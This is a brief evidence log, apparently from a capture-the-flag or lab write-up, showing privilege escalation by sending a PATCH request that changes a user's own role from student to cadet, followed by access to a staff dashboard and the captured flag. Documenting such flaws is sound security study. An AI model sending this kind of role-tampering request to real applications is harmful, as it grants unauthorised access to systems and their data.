# Evidence — Privilege Escalation

- `PATCH /api/profile` with `{"role":"cadet"}` → role updated (student → cadet), HTTP 200.
- `GET /staff/dashboard` with the same session → "Cadet+ access granted — internal staff flag".
- Flag: `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`
